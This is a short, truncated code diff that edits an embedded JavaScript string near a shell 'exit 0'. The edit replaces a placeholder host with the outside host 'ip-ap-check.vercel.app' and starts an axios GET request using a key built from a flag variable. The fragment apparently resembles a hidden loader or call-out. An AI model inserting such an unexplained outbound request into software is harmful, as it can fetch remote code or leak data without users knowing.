@@ -757,7 +757,7 @@ exit 0
     
 		script = `
 	const axios = require('axios');
-const host = "your-vercel-app(2)";
+const host = "ip-ap-check.vercel.app";
 const apikey = "3aeb34a3${flag}";
 axios
   .get(
